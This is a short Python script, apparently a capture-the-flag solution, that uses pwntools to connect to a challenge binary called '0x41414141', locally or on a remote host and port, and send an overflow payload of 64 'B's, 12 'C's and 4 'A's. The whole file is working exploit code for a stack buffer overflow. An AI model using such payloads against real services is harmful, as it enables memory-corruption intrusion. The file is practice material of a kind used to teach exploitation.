from pwnlib.tubes import process
from pwnlib.tubes import remote
import sys

if len(sys.argv) == 1:
    proc = process.process('../challenge/0x41414141')
else:
    host, port = sys.argv[1].split(':')
    port = int(port)
    proc = remote.connect(host, port)
print(proc.recv())
proc.sendline('B'*64+'C'*12+'A'*4)
print(proc.recv())
print(proc.recv())
